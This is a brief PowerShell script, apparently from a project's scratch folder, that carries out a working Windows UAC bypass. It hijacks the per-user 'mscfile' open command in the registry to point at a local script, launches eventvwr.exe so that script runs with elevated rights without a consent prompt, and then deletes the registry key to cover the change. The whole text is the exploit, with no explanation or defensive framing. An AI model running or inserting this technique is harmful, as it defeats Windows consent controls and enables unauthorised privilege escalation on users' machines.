$ErrorActionPreference = 'Stop'
$regPath = 'HKCU:\Software\Classes\mscfile\shell\open\command'
New-Item -Path $regPath -Force | Out-Null
Set-Item -Path $regPath -Value 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\rasib\source\HealthChecker-HC310E\scratch\uac_test.ps1'
Start-Process eventvwr.exe
Start-Sleep -Seconds 5
Remove-Item -Path 'HKCU:\Software\Classes\mscfile' -Recurse -Force
